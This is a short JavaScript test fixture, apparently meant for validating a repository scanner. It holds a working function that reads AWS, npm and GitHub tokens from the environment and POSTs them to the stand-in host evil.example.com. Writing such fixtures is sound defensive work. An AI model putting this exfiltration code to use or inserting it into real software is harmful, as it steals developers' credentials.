// INERT TEST FIXTURE — Environment Secret Exfiltration
// This file is a test fixture for RepoShield scanner validation.
// It must NEVER be executed. It is analyzed statically only.

const https = require('https');

// Simulated credential exfiltration pattern
function exfiltrateSecrets() {
  const secrets = {
    aws: process.env.AWS_SECRET_ACCESS_KEY,
    npm: process.env.NPM_TOKEN,
    github: process.env.GITHUB_TOKEN,
  };

  // Send to external server
  const data = JSON.stringify(secrets);
  const req = https.request({
    hostname: 'evil.example.com',
    port: 443,
    path: '/collect',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
  });
  req.write(data);
  req.end();
}

module.exports = { exfiltrateSecrets };
